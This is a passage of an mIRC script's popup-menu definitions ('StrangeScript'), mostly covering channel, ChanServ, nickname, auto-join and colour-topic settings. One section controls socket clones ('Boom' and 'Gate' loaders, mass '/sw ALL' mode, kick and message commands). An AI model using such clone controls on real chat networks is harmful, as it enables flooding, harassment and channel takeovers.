n155=...Q $key(settings,boss) $+ :{ /sw ALL mode # +q $key(settings,boss) }
n156=...Q $snick(#,1) $+ :{ /sw ALL mode # +q $snick(#,1) }
n157=...-
n158=...Op $snick(#,1) $+ :{ /sw ALL mode # +o $snick(#,1) }
n159=...DeOp $snick(#,1) $+ :{ /sw ALL mode # -o $snick(#,1) }
n160=...-
n161=...Kick User $snick(#,1) $+ :{ /sw ALL kick # $snick(#,1) }
n162=...-
n163=...Set Room +uw:/sw ALL mode # +uw 
n164=...Set Room +m:/sw ALL mode # +m
n165=...Set Room -m:/sw ALL mode # -m
n166=..-
n167=..Talk Menu
n168=...Say ?:{ var %tmp.say = $$?="Message to send" | var %tmp.say1 = $$?="Channel to send to"  | /sw ALL privmsg %tmp.say1 : $+ $replace(%tmp.say,$chr(160),$chr(32))  }
n169=...Say # $+ :{ var %tmp = $$?="Message to send" | /sw ALL privmsg # : $+ $replace(%tmp,$chr(160),$chr(32)) }
n170=.-
n171=.Run Options
n172=..Boom Load Sockets:boom
n173=..Gate Load Sockets:gate
n174=..Use Launch Command:launch
n175=..-
n176=..Run Sockets:{ launch }
n177=..Run Socket, log into # $+ :{
n178=  keywrite settings boom.sock.chan #
n179=  Boom
n180=}
n181=..Run Socket AutoJoin:/sock.aj ALL
n182=.-
n183=.Nick Menu
n184=...Make Socket Nicks:msn
n185=.-
n186=.Set Echo Options
n187=..Boom Echo $chr(91) $+ $chr(160) $+ master(settings,boom.echo) $+ $chr(160) $+ $chr(93)
n188=...ON:masterwrite settings boom.echo ON | setupshow Boom Echo master(settings,boom.echo)
n189=...OFF:masterwrite settings boom.echo OFF | setupshow Boom Echo master(settings,boom.echo)
n190=..Clone Echo $chr(91) $+ $chr(160) $+ master(settings,clone.echo) $+ $chr(160) $+ $chr(93)
n191=...ON:masterwrite settings clone.echo ON | .enable #CloneRead | setupshow Clone Echo master(settings,clone.echo)
n192=...OFF:masterwrite settings clone.echo OFF | .disable #CloneRead | setupshow Clone Echo master(settings,clone.echo)
n193=.-
n194=.Set SockSay
n195=..Echo SockSay: $+ $report(SockSay is set to,$null,$null,master(settings,socksay)).active
n196=..Set SockSay: masterwrite settings socksay $input(What do you want your sockets to say when you kick them?,egi,StrangeScript needs input) | setupshow SockSay master(settings,socksay)
n197=.-
n198=.Sock SysOp Pass $chr(91) $key(settings,saved.socket.password) $chr(93)
n199=..Change:keywrite settings saved.socket.password $input(Enter your Password,egi,StrangeScript needs input) | setupshow Sock SysOp Pass set to $key(settings,saved.socket.password)
n200=..Clear:keywrite settings saved.socket.password | setupshow Sock SysOp Pass set to $key(settings,saved.socket.password)
n201=.-
n202=.Fix (close) Sockets:/fix
n203=Talk Menu
n204=.AsciiCodes: ascii.codes
n205=.BlueTalk: bluetalk $$?="What do you have to say?"
n206=.Col: col $$?="What do you have to say?"
n207=.Dana: dana $$?="What do you have to say?"
n208=.DoDa: doda $$?="What do you have to say?"
n209=.Freak: freak $$?="What do you have to say?"
n210=.Mix: $$?="What do you have to say?"
n211=.TubeArt: tubeart
n212=.TubeTalk: tubetalk $$?="What do you have to say?"
n213=.Twist: $$?="What do you have to say?"
n214=sysop.menu
n215=.Server Access:access *
n216=.-
n217=.Kline $snick(#,1) $address($snick(#,1),4) $+ :/kline $address($snick(#,1),4) $nick $+ / $+ $input(Reason your K-Line'in them,egi,StrangeScript needs input)
n218=.-
n219=.Silence Menu
n220=..Silence $snick(#,1) $+ :mode $snick(#,1) +z
n221=..UnSilence $snick(#,1) $+ :mode $snick(#,1) -z
n222=.-
n223=.Server Ping:ping *
n224=.-
n225=.Kill $chr(91) $snick(#,1) $chr(93) with reason:/kill $snick(#,1) $input(Reason your killing them,egi,StrangeScript needs input)
n226=.Kill $chr(91) $snick(#,1) $chr(93) no reason:/kill $snick(#,1) $me
n227=.Kill $snick(#,1) Gate:/kill $snick(#,1) Gate Detected
n228=.Kill $snick(#,1) Ghost:/kill $snick(#,1) Ghost Kill
n229=.-
n230=.Dns cos.selfip.biz:dns cos.selfip.biz
n231=-
n232=AutoJoin Setup
n233=.Auto Join $chr(91) $key($network,auto.join) $chr(93) $+ :
n234=..Toggle ON:keywrite $network auto.join ON
n235=..Toggle OFF:keywrite $network auto.join OFF
n236=.AutoJoin Rooms:
n237=..1 $chr(91) $gettok($key($network,auto.join.rooms),1,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),1,44)
n238=..2 $chr(91) $gettok($key($network,auto.join.rooms),2,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),2,44)
n239=..3 $chr(91) $gettok($key($network,auto.join.rooms),3,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),3,44)
n240=..4 $chr(91) $gettok($key($network,auto.join.rooms),4,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),4,44)
n241=..5 $chr(91) $gettok($key($network,auto.join.rooms),5,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),5,44) 
n242=.Create AutoJoin: make.auto.join
n243=.Delete AutoJoin:{ keywrite $network auto.join.rooms "" }
n244=.Run AutoJoin:.raw join $key($network,auto.join.rooms)
n245=# Setup
n246=.Password $chr(91) $key($network,# $+ -pass) $chr(93) $+ :
n247=..Identify: /cs IDENTIFY #
n248=..Display: $report($chan,Password,$null,$null,$null,$null,$key($network,# $+ -pass)).chan
n249=..Edit: keyedit $network # $+ -pass "Enter a Channel Password"
n250=..Clear:{ keywrite $network # $+ -pass | $report(StrangeScript,#,password,$null,Cleared).active }
n251=.Auto Setup Room $chr(91) $key($network,# $+ -autosetup) $chr(93) $+ :
n252=..ON:{ keywrite $network # $+ -autosetup ON | $report(StrangeScript,#,Auto Setup,Set to,ON).active }
n253=..OFF:{ keywrite $network # $+ -autosetup OFF | $report(StrangeScript,#,Auto Setup,Set to,OFF).active }
n254=.Topic Lock $chr(91) $key($network,# $+ -topiclock) $chr(93) $+ :
n255=..ON:{ keywrite $network # $+ -topiclock ON | $report(StrangeScript,#,Topic Lock,Set to,ON).active }
n256=..OFF:{ keywrite $network # $+ -topiclock OFF | $report(StrangeScript,#,Topic Lock,Set to,OFF).active }
n257=.Topic:
n258=..View:{ $report(StrangeScript,Topic,#,$null,$unhex.ini($key($network,# $+ -topic))).active }
n259=..Edit:{ set.saved.topic }
n260=..Set It:/topic # $unhex.ini($key($network,# $+ -topic))
n261=..Clear:{ keywrite $network # $+ -topic | $report(StrangeScript,Topic,#l,$null,Cleared).active }
n262=.Mode Lock $chr(91) $key($network,# $+ -modelock) $chr(93) $+ :
n263=..Toggle ON:{ keywrite $network # $+ -modelock ON | $report(StrangeScript,#,Mode Lock,Set to,ON).active }
n264=..Toggle OFF:{ keywrite $network # $+ -modelock OFF | $report(StrangeScript,#,Mode Lock,Set to,OFF).active }
n265=.Mode $chr(91) $Key($network,# $+ -mode) $chr(93) $+ :
n266=.Topic Stuff
n267=..Edit Current Topic:channel
n268=..-
n269=..Misc. Topics
n270=...Arrow Topic:.topic # 2--12--6--5--4--7--8--9--11>12 $chan(#).topic 11<9--8--7--4--5--6--12--2--
n271=...Box Topic:.topic # 8,1°°9,1°°12,1°°13,1°°4,1°°7,1°°8,1 $chan(#).topic 7°°4°°13°°12°°9°°8°°
n272=...Button Topic:.topic # 7>4>5> 15,14<1>15<1>15<1>4[9 $chan(#).topic 4]15,14<1>15<1>15<1> 5<4<7<9
n273=...Caution Topic:.topic # 1,8/8,1/1,8/8,1/1,8/8,1/1,8/8,1/1,8/8,1/1,8 $chan(#).topic 8,1/1,8/8,1/1,8/8,1/1,8/8,1/1,8/8,1/1,8/
n274=...Diamonds Topic:.topic # 2‹›‹›12‹›‹›13‹›‹›6‹›‹›5‹›‹›4‹›‹›7‹›‹›8‹›‹›9‹›‹›3‹›‹›11 $chan(#).topic 3‹›‹›9‹›‹›8‹›‹›7‹›‹›4‹›‹›5‹›‹›6‹›‹›13‹›‹›12‹›‹›2‹›‹›
n275=...Flowery Topic:.topic # 13ºvº11^6ºvº11^13ºvº11^6ºvº11^13ºvº11^6ºvº11^13ºvº11^6ºvº11^13ºvº11^6ºvº11 $chan(#).topic 6ºvº11^13ºvº11^6ºvº11^13ºvº11^6ºvº11^13ºvº11^6ºvº11^13ºvº11^6ºvº11^13ºvº
n276=...Heartbeat Topic:.topic # 9,1~^v^v^v^v^v^v^v^v^v^~ $chan(#).topic ~^v^v^v^v^v^v^v^v^v^~
n277=...Meter Topic:.topic # 4,1 $chan(#).topic 14,14.15,15.0,0.15,15.14,14.9,1 IIIIIIIIIIIIIIIIIIII8,1IIIIIIIIII4,1IIIIIIIIII 14,14.15,15.0,0.15,15.14,14.
n278=...Party Topic:.topic # 4¡!¹'¹!7¡!¹'¹!8¡!¹'¹!9¡!¹'¹!12¡!¹'¹!13¡!¹'¹!4 $chan(#).topic 13!¹'¹!¡12!¹'¹!¡9!¹'¹!¡8!¹'¹!¡7!¹'¹!¡4!¹'¹!¡
n279=...Pointer Topic:.topic # 13(¯`·.¸¸.->12(¯`·.¸¸.->9 $chan(#).topic 12<-.¸¸.·´¯)13<-.¸¸.·´¯)
n280=...Rose Topic:.topic # 9-»4@9«- 9-»4@9«- 9-»4@9«- 9-»4@9«- 9-»4@9«-4 $chan(#).topic 9-»4@9«- 9-»4@9«- 9-»4@9«- 9-»4@9«- 9-»4@9«-
n281=...Southwestern Topic:.topic # 10,10-5,10!i!i!!i!i!!i!i!!i!i!!i!i!!i!i!!i!i!!i!i!!i!i!10,10-5,10 $chan(#).topic 10,10-5,10!i!i!!i!i!!i!i!!i!i!!i!i!!i!i!!i!i!!i!i!!i!i!10,10-
n282=...Sparkle Topic:.topic # 13*©*12*´¯`*.¸11¸.*´¯`* $chan(#).topic 11*´¯`*.¸12¸.*´¯`*13*©*
n283=...Square Wave Topic:.topic # 8,7–•¬–•¬–•¬–•¬–•¬–•¬–•¬–•¬1,7 $chan(#).topic 8,7–•¬–•¬–•¬–•¬–•¬–•¬–•¬–•¬
n284=...Tri-Peak Topic:.topic # 13_,.-11*13~11^13~11*13-.,_,.-11*13~11^13~11*13-.,_ $chan(#).topic _,.-11*13~11^13~11*13-.,_,.-11*13~11^13~11*13-.,_
n285=...Triangle Topic:.topic # 7,1»4»5»14,14 15/1\ 15/1\ 15/1\ 4,1[9 $chan(#).topic 4]14,14 15/1\ 15/1\ 15/1\ 5,1«4«7«
n286=...Wave Topic:.topic # 12¸.·´¯`·.¸13¸.·´¯`·.¸4¸.·´¯`·.¸7¸.·´¯`·.¸8¸.·´¯`·.¸9 $chan(#).topic 8¸.·´¯`·.¸7¸.·´¯`·.¸4¸.·´¯`·.¸13¸.·´¯`·.¸12¸.·´¯`·.¸
n287=...Wing Topic:.topic # 12¯`°²º¤©º°¨¨°º©©º°¨¨°º©=[4 $chan(#).topic 12]=©º°¨¨°º©©º°¨¨°º©¤º²°`¯
n288=..Wavey Topics
n289=...Red Wavey Topic:.topic # 4,0æ0,4æ5,4æ4,5æ1,5æ5,1æ4,1 $chan(#).topic 5,1æ1,5æ4,5æ5,4æ0,4æ4,0æ
n290=...Purple Wavey Topic:.topic # 13,0æ0,13æ6,13æ13,6æ1,6æ6,1æ13,1 $chan(#).topic 6,1æ1,6æ13,6æ6,13æ0,13æ13,0æ
n291=...Blue Wavey Topic:.topic # 12,0æ0,12æ2,12æ12,2æ1,2æ2,1æ12,1 $chan(#).topic 2,1æ1,2æ12,2æ2,12æ0,12æ12,0æ
n292=...Light Blue Wavey Topic:.topic # 11,0æ0,11æ10,11æ11,10æ1,10æ10,1æ10,1 $chan(#).topic 10,1æ1,10æ11,10æ10,11æ0,11æ11,0æ
n293=...Green Wavey Topic:.topic # 9,0æ0,9æ3,9æ9,3æ1,3æ3,1æ9,1 $chan(#).topic 3,1æ1,3æ9,3æ3,9æ0,9æ9,0æ
n294=...Orange Wavey Topic:.topic # 8,0æ0,8æ7,8æ8,7æ1,7æ7,1æ7,1 $chan(#).topic 7,1æ1,7æ8,7æ7,8æ0,8æ8,0æ
n295=..Flame Topics
n296=...Red Flame Topic:.topic # 4,0`%0,4%,5,4`%4,5%,1,5`%5,1%,4,1 $chan(#).topic 5,1`%1,5%,4,5`%5,4%,0,4`%4,0%,
n297=...Purple Flame Topic:.topic # 13,0`%0,13%,6,13`%13,6%,1,6`%6,1%,13,1 $chan(#).topic 6,1`%1,6%,13,6`%6,13%,0,13`%13,0%,
n298=...Blue Flame Topic:.topic # 12,0`%0,12%,2,12`%12,2%,1,2`%2,1%,12,1 $chan(#).topic 2,1`%1,2%,12,2`%2,12%,0,12`%12,0%,
n299=...Light Blue Flame Topic:.topic # 11,0`%0,11%,10,11`%11,10%,1,10`%10,1%,10,1 $chan(#).topic 10,1`%1,10%,11,10`%10,11%,0,11`%11,0%,
n300=...Green Flame Topic:.topic # 9,0`%0,9%,3,9`%9,3%,1,3`%3,1%,9,1 $chan(#).topic 3,1`%1,3%,9,3`%3,9%,0,9`%9,0%,
n301=...Orange Flame Topic:.topic # 8,0`%0,8%,7,8`%8,7%,1,7`%7,1%,7,1 $chan(#).topic 7,1`%1,7%,8,7`%7,8%,0,8`%8,0%,
n302=..Pulse Topics
n303=...Red Pulse Topic:.topic # 4,0~^v0,4^v5,4^v4,5^v1,5^v5,1^v~4,1 $chan(#).topic 5,1~v^1,5v^4,5v^5,4v^0,4v^4,0v^~
n304=...Purple Pulse Topic:.topic # 13,0~^v0,13^v6,13^v13,6^v1,6^v6,1^v~13,1 $chan(#).topic 6,1~v^1,6v^13,6v^6,13v^0,13v^13,0v^~
n305=...Blue Pulse Topic:.topic # 12,0~^v0,12^v2,12^v12,2^v1,2^v2,1^v~12,1 $chan(#).topic 2,1~v^1,2v^12,2v^2,12v^0,12v^12,0v^~
n306=...Light Blue Pulse Topic:.topic # 11,0~^v0,11^v10,11^v11,10^v1,10^v10,1^v~10,1 $chan(#).topic 10,1~v^1,10v^11,10v^10,11v^0,11v^11,0v^~
n307=...Green Pulse Topic:.topic # 9,0~^v0,9^v3,9^v9,3^v1,3^v3,1^v~9,1 $chan(#).topic 3,1~v^1,3v^9,3v^3,9v^0,9v^9,0v^~
n308=...Orange Pulse Topic:.topic # 8,0~^v0,8^v7,8^v8,7^v1,7^v7,1^v~7,1 $chan(#).topic 7,1~v^1,7v^8,7v^7,8v^0,8v^8,0v^~
n309=..3D Box Topics
n310=...Grey Box Topic:.topic # 15,15 $+ $chr(32) $+ 0<14>15 $+ $chr(32) $+ 0<14>15 $+ $chr(32) $+ 0<14>15  $+ $chr(32) $+  1 $+ $chan(#).topic $+ 15  $+ $chr(32) $+  0<14>15 $+ $chr(32) $+ 0<14>15 $+ $chr(32) $+ 0<14>15 $+ $chr(32) $+ 
n311=...Dark Grey Box Topic:.topic # 14,14 $+ $chr(32) $+ 15<1>14 $+ $chr(32) $+ 15<1>14 $+ $chr(32) $+ 15<1>14  $+ $chr(32) $+  1 $+ $chan(#).topic $+ 14  $+ $chr(32) $+  15<1>14 $+ $chr(32) $+ 15<1>14 $+ $chr(32) $+ 15<1>14 $+ $chr(32) $+ 
n312=...Red Box Topic:.topic # 4,4 $+ $chr(32) $+ 0<5>4 $+ $chr(32) $+ 0<5>4 $+ $chr(32) $+ 0<5>4  $+ $chr(32) $+  1 $+ $chan(#).topic $+ 4  $+ $chr(32) $+  0<5>4 $+ $chr(32) $+ 0<5>4 $+ $chr(32) $+ 0<5>4 $+ $chr(32) $+ 
n313=...Purple Box Topic:.topic # 13,13 $+ $chr(32) $+ 0<6>13 $+ $chr(32) $+ 0<6>13 $+ $chr(32) $+ 0<6>13  $+ $chr(32) $+  1 $+ $chan(#).topic $+ 13  $+ $chr(32) $+  0<6>13 $+ $chr(32) $+ 0<6>13 $+ $chr(32) $+ 0<6>13 $+ $chr(32) $+ 
n314=...Blue Box Topic:.topic # 12,12 $+ $chr(32) $+ 0<2>12 $+ $chr(32) $+ 0<2>12 $+ $chr(32) $+ 0<2>12  $+ $chr(32) $+  1 $+ $chan(#).topic $+ 12  $+ $chr(32) $+  0<2>12 $+ $chr(32) $+ 0<2>12 $+ $chr(32) $+ 0<2>12 $+ $chr(32) $+ 
n315=...Light Blue Box Topic:.topic # 11,11 $+ $chr(32) $+ 0<10>11 $+ $chr(32) $+ 0<10>11 $+ $chr(32) $+ 0<10>11  $+ $chr(32) $+  1 $+ $chan(#).topic $+ 11  $+ $chr(32) $+  0<10>11 $+ $chr(32) $+ 0<10>11 $+ $chr(32) $+ 0<10>11 $+ $chr(32) $+ 
n316=...Green Box Topic:.topic # 9,9 $+ $chr(32) $+ 0<3>9 $+ $chr(32) $+ 0<3>9 $+ $chr(32) $+ 0<3>9  $+ $chr(32) $+  1 $+ $chan(#).topic $+ 9  $+ $chr(32) $+  0<3>9 $+ $chr(32) $+ 0<3>9 $+ $chr(32) $+ 0<3>9 $+ $chr(32) $+ 
n317=..Edit:keyedit $network # $+ -mode "Desired channel mode" 
n318=..Clear:{ keywrite $network # $+ -mode | $report(StrangeScript,#,Mode,Set to,$key($network,# $+ mode)).active }
n319=-
n320=Chanserv Menu
n321=.Register #:regchan $network #
n322=.Recover #:msg ChanServ RECOVER #
n323=.Help:
n324=..Help Overview:/ChanServ HELP
n325=..Enter Help:/ChanServ help ##?="Enter the exact help you want"
n326=.-
n327=.Set #:
n328=..Email:
n329=...Set:/ChanServ SET # EMAIL $$?="Email  to use here?"
n330=...Show:/ChanServ INFO #
n331=..EntryMsg:
n332=...Set:/Chanserv SET # ENTRYMSG $$?="Enter your chosen entry message"
n333=...Clear:/Chanserv SET # ENTRYMSG
n334=..Guard:
n335=...ON:/ChanServ SET # GUARD ON
n336=...OFF:/ChanServ SET # GUARD OFF
n337=..KeepTopic:
n338=...ON:/ChanServ SET # KEEPTOPIC ON
n339=...OFF:/ChanServ SET # KEEPTOPIC OFF
n340=..MLock:/ChanServ SET # MLOCK $$?="Modes to set LOCKED"
n341=..NoSync:
n342=...ON:/ChanServ SET # NOSYNC ON
n343=...OFF:/ChanServ SET # NOSYNC OFF
n344=..Private:
n345=...ON:/ChanServ SET # PRIVATE ON
n346=...OFF:/ChanServ SET # PRIVATE OFF
n347=..Property:
n348=...Set:/ChanServ SET # PROPERTY $$?="Property NAME" $$?="Property VALUE"
n349=...Clear:/ChanServ SET # PROPERTY $$?="Property NAME to clear"
n350=..Restricted:
n351=...ON:/ChanServ SET # RESTRICTED ON
n352=...OFF:/ChanServ SET # RESTRICTED OFF
n353=..Secure:
n354=...ON:/ChanServ SET # SECURE ON
n355=...OFF:/ChanServ SET # SECURE OFF
n356=..TopicLock:
n357=...ON:/ChanServ SET # TOPICLOCK ON
n358=...OFF:/ChanServ SET # TOPICLOCK OFF
n359=..URL:
n360=...Set:/ChanServ SET # URL $$?="URL to set for this room"
n361=...Clear:/ChanServ SET # URL
n362=..Verbose:
n363=...ON:/ChanServ SET # VERBOSE ON
n364=...OPS:/ChanServ SET # VERBOSE OPS
n365=...OFF:/ChanServ SET # VERBOSE OFF
n366=.-
n367=.Op/DeOp:
n368=..Op:/ChanServ OP # $$?="Nick to OP"
n369=..DeOp:/ChanServ OP # $$?="Nick to DEOP"
n370=..Voice:/ChanServ OP # $$?="Nick to VOICE"
n371=..DeVoice:/ChanServ OP # $$?="Nick to DEVOICE"
n372=.Topic:
n373=..Set:/ChanServ TOPIC # $$?="Topic to set"
n374=..Clear:/ChanServ TOPIC #
n375=.Info:msg ChanServ INFO #
n376=.Status:
n377=..Status of $me:/ChanServ STATUS
n378=..Status of #:/ChanServ STATUS #
n379=MemoServ Menu:
n380=.List All:/MemoServ LIST
n381=.Send Menu
n382=..Send User:{ /memoserv send $$?="Nick To Send To?" $$?="Message Your Sending" }
n383=..Send Chan:/memoserv send # $$?="Message To Send To This Channel"
n384=..Send Sop:halt
n385=.Read Menu:
n386=..List All Memos:/memoserv list
n387=..List A Memo:/memoserv list $$?="NUM Of Memo To List?"
n388=..Read A Memo:/memoserv read $$?="NUM Of Memo To Read?"
n389=..Delete A Memo:/memoserv del $$?="NUM Of Memo To Delete?"
n390=..UnDelete A Memo:/memoserv undelete $$?="NUM Of Memo To UnDelete?"
n391=..Purge Deleted:/MemoServ purge
n392=.Help:
n393=..Help Overview:/MemoServ HELP
n394=..Enter Which Help:/MemoServ  HELP $$?="Enter the exact help you want"
n395=-
n396=Main $network Settings
n397=.Auto Identify $chr(91) $key($network,auto.ident) $chr(93) $+ :
n398=...Toggle ON:{ keywrite $network auto.ident ON | $report(StrangeScript,Auto Identify,$null,$null,Toggled to,$key($network,auto.ident)).active }
n399=...Toggle OFF:{ keywrite $network auto.ident OFF | $report(StrangeScript,Auto Identify,$null,$null,Toggled to,$key($network,auto.ident)).active }
n400=.DeOp Protect $chr(91) $key($network,deop.protect) $chr(93) $+ :
n401=..Toggle ON:{ keywrite $network deop.protect ON | $report(StrangeScript,DeOp Protect,$null,$null,Toggled to,$key($network,deop.protect)).active }
n402=..Toggle OFF:{ keywrite $network deop.protect OFF | $report(StrangeScript,DeOp Protect,$null,$null,Toggled to,$key($network,deop.protect)).active }
n403=.AutoJoin Setup
n404=..Auto Join: $chr(91) $key($network,auto.join) $chr(93) $+ :
n405=...Toggle ON:{ keywrite $network auto.join ON | $report(StrangeScript,Auto Join,$null,$null,Toggled to,$key($network,auto.join)).active }
n406=...Toggle OFF:{ keywrite $network auto.join OFF | $report(StrangeScript,Auto Join,$null,$null,Toggled to,$key($network,auto.join)).active }
n407=..AutoJoin Rooms
n408=...1 $chr(91) $gettok($key($network,auto.join.rooms),1,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),1,44)
n409=...2 $chr(91) $gettok($key($network,auto.join.rooms),2,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),2,44)
n410=...3 $chr(91) $gettok($key($network,auto.join.rooms),3,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),3,44)
n411=...4 $chr(91) $gettok($key($network,auto.join.rooms),4,44) $chr(93) $+ :join $gettok($key($network,auto.join.rooms),4,44)
n412=..Create AutoJoin: make.auto.join
n413=..Delete AutoJoin: keywrite $network auto.join.rooms
n414=..Run AutoJoin:.raw join $key($network,auto.join.rooms).ircMode $chr(91) $key($network,ircMode) $chr(93) $+ :halt
n415=.Saved Nicks
n416=..$chr(91) $key($network,saved.nick.1) $chr(93) $+ :
n417=...Use:/nick $key($network,saved.nick.1)
n418=...Edit: keyedit $network saved.nick.1 "Saved nick 1"
n419=...Clear: keywrite $network saved.nick.1
n420=..$chr(91) $key($network,saved.nick.2) $chr(93) $+ :
n421=...Use:/nick $key($network,saved.nick.2)
n422=...Edit: keyedit $network saved.nick.2 "Saved nick 2"
n423=...Clear: keywrite $network saved.nick.2Nick Password
n424=.Nick Passwords
n425=..$key($network,saved.nick.1) $chr(91) $key($network,$key($network,saved.nick.1)) $chr(93) $+ :
n426=...Identify: { NickServ Identify $key($network,saved.nick.1) }
n427=...Edit: keyedit $network $key($network,saved.nick.1) "New Nick Password"
n428=...Clear:{ keywrite $network $key($network,saved.nick.1) | $report(StrangeScript,$key($network,saved.nick.1),password,$null,Cleared).active }
n429=..$key($network,saved.nick.2) $chr(91) $key($network,$key($network,saved.nick.2)) $chr(93) $+ :
n430=...Identify: { NickServ Identify $key($network,saved.nick.2) }
n431=...Edit: keyedit $network $key($network,saved.nick.2) "New Nick Password"
n432=...Clear:{ keywrite $network $key($network,saved.nick.2) | $report(StrangeScript,$key($network,saved.nick.2),password,$null,Cleared).active }
n433=.Auto Nick Recover $chr(91) $key($network,recover.nick) $chr(93) $+ :
n434=..On:{ keywrite $network recover.nick ON | $report(StrangeScript,Auto Nick Recover,$null,$null,Toggled to,$key($network,recover.nick)).active }
n435=..Off:{ keywrite $network recover.nick OFF | $report(StrangeScript,Auto Nick Recover,$null,$null,Toggled to,$key($network,recover.nick)).active }
n436=.Do Nick Recover
n437=..Recover Nick $chr(91) $key($network,saved.nick.1) $chr(93) $+ :/recover $key($network,saved.nick.1)
n438=..Recover Nick $chr(91) $key($network,saved.nick.2) $chr(93) $+ :/recover $key($network,saved.nick.2)
n439=.Boss $chr(91) $key($network,boss) $chr(93) $+ :
n440=..Not editable:halt
n441=.Lag Check Settings
n442=..Toggle LagCheck $chr(91) $key($network,Lagchk) $chr(93) $+ :
n443=...ON:Lagon
n444=...OFF:Lagoff
n445=..LagSet Secs $chr(91) $key($network,Lagmrcsecs) $chr(93) $+ :LagSet.Secs
n446=.CTCP Ignore $chr(91) $key($network,ctcp.ignore) $chr(93) $+ :
n447=..ON:/ctcp.ignore ON
n448=..OFF:/ctcp.ignore OFF
n449=StrangeScript Settings
n450=.Quit Message $chr(91) $unhex.ini($key(StrangeScript,quit.message)) $chr(93) $+ :
n451=..List: if ($unhex.ini($key(StrangeScript,quit.message)) != $null) { $report(StrangeScript,Quit Message,$null,$null,$unhex.ini($key(StrangeScript,quit.message))).active }
n452=..Add: keywrite StrangeScript quit.message $$?="Add your Quit Message"
n453=..Edit: keyedit StrangeScript quit.message "Edit your Quit Message"
n454=..Clear: { keywrite StrangeScript quit.message }
n455=.Part Message $chr(91) $unhex.ini($key(StrangeScript,part.message)) $chr(93) $+ :
n456=..List: if ($unhex.ini($key(StrangeScript,part.message)) != $null) { $report(StrangeScript,Part Message,$null,$null,$unhex.ini($key(StrangeScript,part.message))).active }
n457=..Add: keywrite StrangeScript part.message $$?="Add your Part Message"
n458=..Edit: keyedit StrangeScript part.message "Edit your Part Message"
n459=..Clear: { keywrite StrangeScript part.message }
n460=.Away Message $chr(91) $unhex.ini($key(StrangeScript,away.message)) $chr(93) $+ :
n461=..List: if ($unhex.ini($key(StrangeScript,away.message)) != $null) { $report(StrangeScript,Away Message,$null,$null,$unhex.ini($key(StrangeScript,away.message))).active }
n462=..Add: keywrite StrangeScript away.message $$?="Add your Away Message"
n463=..Edit: keyedit StrangeScript away.message "Edit your Away Message"
n464=..Clear: { keywrite StrangeScript away.message }
n465=.Away Nick Add $chr(91) $key(StrangeScript,away.nick.add) $chr(93) $+ : 
n466=..Edit: keyedit StrangeScript away.nick.add "Enter An Away Addition To You'r Nick"
n467=..Clear: { keywrite StrangeScript away.nick.add }
n468=.Away Remind time $chr(91) $key(StrangeScript,away.remind) $chr(93) $+ : 
n469=..Edit: keyedit StrangeScript away.remind "Enter An Away Remind Time in Seconds"
n470=..Clear: { keywrite StrangeScript away.remind }
n471=.-
n472=.Which.Window $chr(91) $key(StrangeScript,which.window) $chr(93) $+ :
n473=..ACTIVE: keywrite StrangeScript which.window ACTIVE | $report(WhichWindow,SET,$null,$null,Active).active
n474=..STATUS: keywrite StrangeScript which.window STATUS | $report(WhichWindow,SET,$null,$null,Status).active
n475=..ON: keywrite StrangeScript which.window ON | $report(WhichWindow,SET,$null,$null,On).active
n476=..OFF: keywrite StrangeScript which.window OFF | $report(WhichWindow,SET,$null,$null,Off).active
n477=.PingPong Show $chr(91) $key(StrangeScript,pingpong.show) $chr(93) $+ :
n478=..ON:/pingpong ON
n479=..OFF:/pingpong OFF
n480=.Script Sounds $chr(91) $key(StrangeScript,script.sounds) $chr(93) $+ :
n481=..ON:/script.sounds ON
n482=..OFF:/script.sounds OFF
n483=.Key Write Show $chr(91) $key(StrangeScript,key.writes) $chr(93) $+ :
n484=..ON:/key.writes ON
n485=..OFF:/key.writes OFF
n486=.Key Read Show $chr(91) $key(StrangeScript,key.reads) $chr(93) $+ :
n487=..ON:/key.reads ON
n488=..OFF:/key.reads OFF
n489=.Default Modes $chr(91) $key(StrangeScript,mode.default) $chr(93) $+ :
n490=..Edit:keyedit StrangeScript mode.default "Default Mode written to new channels"
n491=..Clear:{ keywrite StrangeScript mode.default | $report(StrangeScript,Mode.default,Set to,$key(StrangeScript,mode.default)).active }
n492=.Go FullScreen $chr(91) $key(StrangeScript,go.full) $chr(93) $+ :
n493=..ON:{ keywrite StrangeScript go.full ON | $report(StrangeScript,Go FullScreen,Set to,$key(StrangeScript,go.full)).active }
n494=..OFF:{ keywrite StrangeScript go.full OFF | $report(StrangeScript,Go FullScreen,Set to,$key(StrangeScript,go.full)).active }
n495=.Serv On Start $chr(91) $key(StrangeScript,serv.on.start) $chr(93) $+ :
n496=..ON:{ keywrite StrangeScript serv.on.start ON | $report(StrangeScript,Go FullScreen,Set to,$key(StrangeScript,serv.on.start)).active }
n497=..OFF:{ keywrite StrangeScript serv.on.start OFF | $report(StrangeScript,Go FullScreen,Set to,$key(StrangeScript,serv.on.start)).active }
n498=Main Color and Display Setup
n499=.Bold Prompts $chr(91) $key(StrangeScript,sc.bold) $chr(93)
n500=..ON:keywrite StrangeScript sc.bold ON
n501=..OFF:keywrite StrangeScript sc.bold OFF
n502=.Display Color Defaults
n503=..Save Default Low Color $chr(91) %sc1 $chr(93) $+ :set %sc1 $$?="Please select from 00 - 15" | /setupshow  $+ %sc1 your color choice was this | halt
n504=..Save Default High Color $chr(91) %sc2 $chr(93) $+ :set %sc2 $$?="Please select from 00 - 15" | /setupshow  $+ %sc2 your color choice was this | halt
n505=..Save Default Bright Color $chr(91) %sc3 $chr(93) $+ :set %sc3 $$?="Please select from 00 - 15" | /setupshow  $+ %sc3 your color choice was this | halt
n506=..Save Default Message Color $chr(91) %sc4 $chr(93) $+ :set %sc4 $$?="Please select from 00 - 15" | /setupshow  $+ %sc4 your color choice was this | halt
n507=..Save Default Seperator $chr(91) %sc.seperater $chr(93) $+ :set %sc.seperater $$?="Please select from 00 - 15" | setupshow  $+ %sc.seperater your color choice was this | halt.NickList Color Defaults
n508=-
n509=Info
n510=.Modes:mode #
n511=.Topic:topic #
n512=.Who:who #
n513=.Names:names #
n514=Moderate
n515=.Channel Editor:channel #
